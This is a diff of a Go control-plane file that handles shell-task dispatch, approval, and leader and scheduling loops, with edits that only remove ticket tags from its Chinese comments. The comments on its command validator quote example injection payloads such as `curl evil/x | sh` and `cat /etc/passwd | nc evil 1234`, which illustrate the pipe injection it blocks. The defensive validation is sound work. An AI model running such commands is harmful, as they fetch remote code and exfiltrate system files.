@@ -1,6 +1,6 @@
 // server_tasks.go 任务相关 HTTP handler 与后台循环。
 //
-// 从 server.go 拆分而来（task 114：按路由域拆分巨型 server.go）。
+// 从 server.go 拆分而来（按路由域拆分巨型 server.go）。
 // 包含任务下发/列表/取消/审批等端点，以及定时调度/归档/租约回收/选主等后台循环，
 // 逻辑未做任何修改。
 package controlplane
@@ -35,11 +35,11 @@ func sanitizeAuditDetail(s string) string {
 	return s
 }
 
-// maxCommandLen 控制面侧命令长度上限（P0 安全加固纵深防御）。
+// maxCommandLen 控制面侧命令长度上限（安全加固纵深防御）。
 // 超过此长度的命令几乎不可能是合法运维操作，更可能是注入载荷或二进制 blob。
 const maxCommandLen = 4096
 
-// validateCommand 控制面侧命令内容校验（P0 安全加固纵深防御）。
+// validateCommand 控制面侧命令内容校验（安全加固纵深防御）。
 // 与 agent 端 checkShellMetachars 保持一致的元字符拦截策略，在控制面侧提前拦截，
 // 避免恶意命令进入任务队列后被 agent 拉取执行（即使 agent 端校验被绕过或未启用白名单）。
 //
@@ -47,10 +47,10 @@ const maxCommandLen = 4096
 //   - 非空（调用方应已校验，此处兜底）。
 //   - 长度 <= maxCommandLen（4096），防超长命令撑爆存储/日志或携带二进制载荷。
 //   - 不含危险 shell 元字符：换行符 \n \r、分号 ;、命令替换 $() `、单个 &（后台执行）、
-//     管道符 |（P0-2 安全加固：拦截管道符防 `curl evil/x | sh` 这类管道注入）。
+//     管道符 |（安全加固：拦截管道符防 `curl evil/x | sh` 这类管道注入）。
 //   - 允许的合法模式：&&（命令链接符，第 81 行特殊处理）、>& / &>（重定向操作符）。
 //
-// 安全考量（P0-2 管道符拦截）：
+// 安全考量（管道符拦截）：
 //   - 原实现注释明写"管道符 | 暂不拦截"，导致 `curl evil/x | sh`、`cat /etc/passwd | nc evil 1234`
 //     等管道注入载荷可过校验。管道符是 shell 注入高频载体，控制面侧应默认拦截。
 //   - 合法运维场景极少需要在单条任务命令中使用管道（如需复合命令应拆分为多任务或用脚本）；
@@ -83,7 +83,7 @@ func validateCommand(command string) error {
 	if strings.Contains(command, "`") {
 		return errors.New("command contains backtick metacharacter: rejected")
 	}
-	// P0-2 安全加固：拦截管道符 |，防 `curl evil/x | sh` 这类管道注入。
+	// 安全加固：拦截管道符 |，防 `curl evil/x | sh` 这类管道注入。
 	// 原实现暂不拦截管道符，导致管道注入载荷可过校验；现已默认拦截。
 	if strings.Contains(command, "|") {
 		return errors.New("command contains pipe metacharacter ('|'): rejected")
@@ -99,7 +99,7 @@ func validateCommand(command string) error {
 	return nil
 }
 
-// handleCreateTask 处理 POST /api/v1/tasks：内部下发入口（P0-2）。
+// handleCreateTask 处理 POST /api/v1/tasks：内部下发入口。
 // 请求体：{ "agentID": "...", "type": "shell", "command": "...", "tenantID": "可选" }
 // 租户隔离：任务只能下发给本租户（网关注入）的 agent；缺失则按 body.tenantID 兜底。
 func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
@@ -107,7 +107,7 @@ func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
 		jsonError(w, http.StatusMethodNotAllowed, "method not allowed")
 		return
 	}
-	// P1-6 联邦入站验签：带转发标记的请求必须验签，防跨不可信网段伪造租户身份。
+	// 联邦入站验签：带转发标记的请求必须验签，防跨不可信网段伪造租户身份。
 	if err := s.verifyFederationRequest(r); err != nil {
 		writeJSON(w, http.StatusUnauthorized, map[string]string{"error": err.Error()})
 		return
@@ -125,7 +125,7 @@ func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
 		Command          string `json:"command"`
 		TenantID         string `json:"tenantID"`
 		Schedule         string `json:"schedule"`         // F4 可选：5 字段 cron，设定则成为模板任务（周期派生实例）
-		ApprovalRequired bool   `json:"approvalRequired"` // B1 修复 10：高风险任务需审批后才可执行
+		ApprovalRequired bool   `json:"approvalRequired"` // 修复 10：高风险任务需审批后才可执行
 		MaxRetries       *int   `json:"maxRetries"`       // F2 可选：单任务重试上限覆盖（nil=用全局默认）
 	}
 	if err := decodeJSONBody(w, r, &body); err != nil {
@@ -139,7 +139,7 @@ func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
 	if body.Type == "" {
 		body.Type = "shell"
 	}
-	// P0 安全加固纵深防御：控制面侧命令内容校验。
+	// 安全加固纵深防御：控制面侧命令内容校验。
 	// 仅对 shell 类型任务校验 command（file 类型任务的 command 字段无 shell 语义）。
 	// 与 agent 端 checkShellMetachars 保持一致的元字符拦截策略，在控制面侧提前拦截，
 	// 避免恶意命令进入任务队列。校验失败返回 400 Bad Request。
@@ -149,7 +149,7 @@ func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 	}
-	// H6 认证防御：强制使用头中的租户 ID，忽略 body 中的 tenantID，防 body 覆盖头租户越权。
+	// 认证防御：强制使用头中的租户 ID，忽略 body 中的 tenantID，防 body 覆盖头租户越权。
 	targetTenant := actx.TenantID
 	agent := s.lookupAgent(body.AgentID)
 	if agent == nil || (targetTenant != "" && agent.TenantID != targetTenant) {
@@ -172,9 +172,9 @@ func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
 		Command:          body.Command,
 		Schedule:         body.Schedule, // F4 模板任务（cron）随创建下传
 		MaxRetries:       maxRetries,
-		ApprovalRequired: body.ApprovalRequired, // B1 修复 10：高风险任务需审批
+		ApprovalRequired: body.ApprovalRequired, // 修复 10：高风险任务需审批
 	})
-	// M1-4：携带 ctx 的 trace_id，使审计日志与链路追踪关联。
+	// 携带 ctx 的 trace_id，使审计日志与链路追踪关联。
 	s.audit(r.Context(), &proto.AuditEvent{
 		TenantID: targetTenant,
 		UserID:   actx.UserID,
@@ -182,7 +182,7 @@ func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
 		Target:   task.TaskID,
 		Detail:   sanitizeAuditDetail(body.Command),
 	})
-	// 事件总线（P1-5）+ 队列深度观测（P2-1）。
+	// 事件总线+ 队列深度观测。
 	if s.bus != nil {
 		s.bus.Publish(r.Context(), events.Event{
 			TenantID: targetTenant, UserID: actx.UserID,
@@ -192,9 +192,9 @@ func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
 	if s.metrics != nil {
 		s.metrics.SetQueueDepth(s.store.PendingDepth())
 	}
-	// M3-2B SSE：通知前端新任务已创建（前端任务表追加一行 pending）
-	// H6 租户隔离：携带 targetTenant，仅同租户订阅者收到。
-	// M1-4：携带 ctx 的 trace_id，使 SSE 事件与链路追踪关联。
+	// SSE：通知前端新任务已创建（前端任务表追加一行 pending）
+	// 租户隔离：携带 targetTenant，仅同租户订阅者收到。
+	// 携带 ctx 的 trace_id，使 SSE 事件与链路追踪关联。
 	s.publishEvent(r.Context(), "task_status", targetTenant, map[string]string{
 		"taskID":  task.TaskID,
 		"status":  task.Status,
@@ -204,8 +204,8 @@ func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
 }
 
 // handleListTasks 统一处理 /api/v1/tasks：
-//   - GET：列出任务（租户隔离 + 可选 ?status= 过滤 + B1 修复 3 分页），经 domain 防腐层对外暴露领域模型。
-//   - POST：下发给指定 agent（逻辑复用 handleCreateTask，P0-2 内部下发入口）。
+//   - GET：列出任务（租户隔离 + 可选 ?status= 过滤 + 修复 3 分页），经 domain 防腐层对外暴露领域模型。
+//   - POST：下发给指定 agent（逻辑复用 handleCreateTask，内部下发入口）。
 func (s *Server) handleListTasks(w http.ResponseWriter, r *http.Request) {
 	if r.Method == http.MethodPost {
 		s.handleCreateTask(w, r)
@@ -231,7 +231,7 @@ func (s *Server) handleListTasks(w http.ResponseWriter, r *http.Request) {
 		}
 		out = append(out, domain.TaskFromProto(t))
 	}
-	// B1 修复 3：分页（向后兼容：不传 page 返回全量）。
+	// 修复 3：分页（向后兼容：不传 page 返回全量）。
 	page, pageSize := parsePagination(r.URL.Query())
 	if page == 0 {
 		writeJSON(w, http.StatusOK, out)
@@ -263,7 +263,7 @@ func (s *Server) scheduleLoop(ctx context.Context) {
 			return
 		case <-ticker.C:
 			if !s.store.IsLeader() {
-				continue // A3：非 leader 不派生，避免多副本重复派生定时实例
+				continue // 非 leader 不派生，避免多副本重复派生定时实例
 			}
 			n := s.store.FireDueSchedules(time.Now())
 			if n > 0 {
@@ -301,7 +301,7 @@ func (s *Server) archiveLoop(ctx context.Context) {
 	}
 }
 
-// reclaimLoop 周期性复位超期 running 任务（P0-1 任务必达）：agent 领取后超过租约租期仍未
+// reclaimLoop 周期性复位超期 running 任务（任务必达）：agent 领取后超过租约租期仍未
 // 上报结果，视为失联，复位 pending 重新进入调度队列。ctx 取消即退出。
 func (s *Server) reclaimLoop(ctx context.Context) {
 	ticker := time.NewTicker(30 * time.Second)
@@ -312,7 +312,7 @@ func (s *Server) reclaimLoop(ctx context.Context) {
 			return
 		case <-ticker.C:
 			if !s.store.IsLeader() {
-				continue // A3：非 leader 不回收，避免多副本重复复位 running 任务
+				continue // 非 leader 不回收，避免多副本重复复位 running 任务
 			}
 			n := s.store.ReclaimStaleTasks(time.Duration(s.cfg.TaskLeaseSec) * time.Second)
 			if n > 0 {
@@ -322,7 +322,7 @@ func (s *Server) reclaimLoop(ctx context.Context) {
 	}
 }
 
-// leaderLoop A3 选主循环：每 LeaderTickSec 秒续租一次 leader 租约，
+// leaderLoop 选主循环：每 LeaderTickSec 秒续租一次 leader 租约，
 // 并通过日志在晋升/失去 leader 身份时打印一次（避免每 tick 刷屏）。
 // 仅 leader 才会由 reclaimLoop/scheduleLoop（及后续 provision/离线归档循环）真正执行周期协调任务。
 func (s *Server) leaderLoop(ctx context.Context) {
@@ -355,7 +355,7 @@ func (s *Server) leaderLoop(ctx context.Context) {
 	}
 }
 
-// handleBatchCreateTasks 处理 POST /api/v1/tasks/batch：向多台 agent 批量下发同一任务模板（P0-3 危点闭环）。
+// handleBatchCreateTasks 处理 POST /api/v1/tasks/batch：向多台 agent 批量下发同一任务模板（危点闭环）。
 // 请求体：{ "targets":["a1","a2"], "type","command","content","path","tenantID" }
 // 逐台 CreateTask（复用租户隔离校验与审计）；返回已创建任务 ID 与逐台失败条目。
 func (s *Server) handleBatchCreateTasks(w http.ResponseWriter, r *http.Request) {
@@ -378,7 +378,7 @@ func (s *Server) handleBatchCreateTasks(w http.ResponseWriter, r *http.Request) 
 		Path             string   `json:"path"`
 		TenantID         string   `json:"tenantID"`
 		Schedule         string   `json:"schedule"`         // F4 可选：批量下发的任务模板也支持 cron
-		ApprovalRequired bool     `json:"approvalRequired"` // B1 修复 10：批量下发也支持审批
+		ApprovalRequired bool     `json:"approvalRequired"` // 修复 10：批量下发也支持审批
 	}
 	if err := decodeJSONBody(w, r, &body); err != nil {
 		writeJSON(w, http.StatusBadRequest, map[string]string{"error": err.Error()})
@@ -395,7 +395,7 @@ func (s *Server) handleBatchCreateTasks(w http.ResponseWriter, r *http.Request) 
 	if body.Type == "" {
 		body.Type = "shell"
 	}
-	// P0 安全加固纵深防御：控制面侧命令内容校验（与 handleCreateTask 一致）。
+	// 安全加固纵深防御：控制面侧命令内容校验（与 handleCreateTask 一致）。
 	// 批量下发影响面更大，更应在控制面侧提前拦截恶意命令。
 	if body.Type == "shell" {
 		if err := validateCommand(body.Command); err != nil {
@@ -403,7 +403,7 @@ func (s *Server) handleBatchCreateTasks(w http.ResponseWriter, r *http.Request) 
 			return
 		}
 	}
-	// H6 认证防御：强制使用头中的租户 ID，忽略 body 中的 tenantID，防 body 覆盖头租户越权。
+	// 认证防御：强制使用头中的租户 ID，忽略 body 中的 tenantID，防 body 覆盖头租户越权。
 	targetTenant := actx.TenantID
 	created := make([]string, 0, len(body.Targets))
 	type fail struct {
@@ -426,9 +426,9 @@ func (s *Server) handleBatchCreateTasks(w http.ResponseWriter, r *http.Request) 
 			Path:             body.Path,
 			Schedule:         body.Schedule,         // F4 批量模板也支持 cron
 			MaxRetries:       s.cfg.TaskMaxRetries,  // F2 批量下发同样带重试上限
-			ApprovalRequired: body.ApprovalRequired, // B1 修复 10：批量下发也支持审批
+			ApprovalRequired: body.ApprovalRequired, // 修复 10：批量下发也支持审批
 		})
-		// M1-4：携带 ctx 的 trace_id，使审计日志与链路追踪关联。
+		// 携带 ctx 的 trace_id，使审计日志与链路追踪关联。
 		s.audit(r.Context(), &proto.AuditEvent{
 			TenantID: targetTenant,
 			UserID:   actx.UserID,
@@ -443,9 +443,9 @@ func (s *Server) handleBatchCreateTasks(w http.ResponseWriter, r *http.Request) 
 			})
 		}
 		created = append(created, task.TaskID)
-		// M3-2B SSE：批量下发也逐条推送 task_status（前端实时追加任务行）
-		// H6 租户隔离：携带 targetTenant，仅同租户订阅者收到。
-		// M1-4：携带 ctx 的 trace_id，使 SSE 事件与链路追踪关联。
+		// SSE：批量下发也逐条推送 task_status（前端实时追加任务行）
+		// 租户隔离：携带 targetTenant，仅同租户订阅者收到。
+		// 携带 ctx 的 trace_id，使 SSE 事件与链路追踪关联。
 		s.publishEvent(r.Context(), "task_status", targetTenant, map[string]string{
 			"taskID":  task.TaskID,
 			"status":  task.Status,
@@ -465,8 +465,8 @@ func (s *Server) handleBatchCreateTasks(w http.ResponseWriter, r *http.Request) 
 // handleTaskRouting 统一分派 /api/v1/tasks/{id}/... 子路径：
 //   - POST /api/v1/tasks/{id}/cancel：取消任务（F3）
 //   - GET  /api/v1/tasks/{id}/result：查询单条执行结果（A5/F7）
-//   - POST /api/v1/tasks/{id}/approve：审批通过任务（B1 修复 10）
-//   - POST /api/v1/tasks/{id}/reject：审批拒绝任务（B1 修复 10）
+//   - POST /api/v1/tasks/{id}/approve：审批通过任务（修复 10）
+//   - POST /api/v1/tasks/{id}/reject：审批拒绝任务（修复 10）
 func (s *Server) handleTaskRouting(w http.ResponseWriter, r *http.Request) {
 	idAndRest := strings.TrimPrefix(r.URL.Path, "/api/v1/tasks/")
 	parts := strings.SplitN(idAndRest, "/", 2)
@@ -505,7 +505,7 @@ func (s *Server) handleCancelTask(w http.ResponseWriter, r *http.Request, id str
 		writeJSON(w, http.StatusNotFound, map[string]string{"error": "task not cancellable (not found / not pending|running / tenant mismatch)"})
 		return
 	}
-	// M1-4：携带 ctx 的 trace_id，使审计日志与链路追踪关联。
+	// 携带 ctx 的 trace_id，使审计日志与链路追踪关联。
 	s.audit(r.Context(), &proto.AuditEvent{
 		TenantID: tenant, UserID: actx.UserID, Action: "cancel_task", Target: id, Detail: "cancelled via HTTP",
 	})
@@ -514,9 +514,9 @@ func (s *Server) handleCancelTask(w http.ResponseWriter, r *http.Request, id str
 			TenantID: tenant, UserID: actx.UserID, Action: "cancel_task", Target: id, Level: events.LevelInfo,
 		})
 	}
-	// M3-2B SSE：通知前端任务已取消（任务表对应行状态翻 cancelled）
-	// H6 租户隔离：携带 tenant，仅同租户订阅者收到。
-	// M1-4：携带 ctx 的 trace_id，使 SSE 事件与链路追踪关联。
+	// SSE：通知前端任务已取消（任务表对应行状态翻 cancelled）
+	// 租户隔离：携带 tenant，仅同租户订阅者收到。
+	// 携带 ctx 的 trace_id，使 SSE 事件与链路追踪关联。
 	s.publishEvent(r.Context(), "task_status", tenant, map[string]string{
 		"taskID": id,
 		"status": "cancelled",
@@ -552,7 +552,7 @@ func (s *Server) handleTaskResult(w http.ResponseWriter, r *http.Request, id str
 }
 
 // ============================================================================
-// B1 修复 10：作业审批 API
+// 修复 10：作业审批 API
 // ============================================================================
 
 // handleApproveTask 处理 POST /api/v1/tasks/{id}/approve：审批通过任务。
@@ -569,7 +569,7 @@ func (s *Server) handleApproveTask(w http.ResponseWriter, r *http.Request, id st
 		writeJSON(w, http.StatusNotFound, map[string]string{"error": "task not found, not pending_approval, or tenant mismatch"})
 		return
 	}
-	// M1-4：携带 ctx 的 trace_id，使审计日志与链路追踪关联。
+	// 携带 ctx 的 trace_id，使审计日志与链路追踪关联。
 	s.audit(r.Context(), &proto.AuditEvent{
 		TenantID: actx.TenantID, UserID: actx.UserID, Action: "approve_task", Target: id,
 		Detail: "approved via HTTP",
@@ -579,8 +579,8 @@ func (s *Server) handleApproveTask(w http.ResponseWriter, r *http.Request, id st
 			TenantID: actx.TenantID, UserID: actx.UserID, Action: "approve_task", Target: id, Level: events.LevelInfo,
 		})
 	}
-	// M3-2B SSE：通知前端任务已审批通过。
-	// M1-4：携带 ctx 的 trace_id，使 SSE 事件与链路追踪关联。
+	// SSE：通知前端任务已审批通过。
+	// 携带 ctx 的 trace_id，使 SSE 事件与链路追踪关联。
 	s.publishEvent(r.Context(), "task_status", actx.TenantID, map[string]string{
 		"taskID": id,
 		"status": "pending",
@@ -609,7 +609,7 @@ func (s *Server) handleRejectTask(w http.ResponseWriter, r *http.Request, id str
 		writeJSON(w, http.StatusNotFound, map[string]string{"error": "task not found, not pending_approval, or tenant mismatch"})
 		return
 	}
-	// M1-4：携带 ctx 的 trace_id，使审计日志与链路追踪关联。
+	// 携带 ctx 的 trace_id，使审计日志与链路追踪关联。
 	s.audit(r.Context(), &proto.AuditEvent{
 		TenantID: actx.TenantID, UserID: actx.UserID, Action: "reject_task", Target: id,
 		Detail: sanitizeAuditDetail("rejected via HTTP: " + body.Reason),
@@ -619,8 +619,8 @@ func (s *Server) handleRejectTask(w http.ResponseWriter, r *http.Request, id str
 			TenantID: actx.TenantID, UserID: actx.UserID, Action: "reject_task", Target: id, Level: events.LevelInfo,
 		})
 	}
-	// M3-2B SSE：通知前端任务已审批拒绝。
-	// M1-4：携带 ctx 的 trace_id，使 SSE 事件与链路追踪关联。
+	// SSE：通知前端任务已审批拒绝。
+	// 携带 ctx 的 trace_id，使 SSE 事件与链路追踪关联。
 	s.publishEvent(r.Context(), "task_status", actx.TenantID, map[string]string{
 		"taskID": id,
 		"status": "rejected",
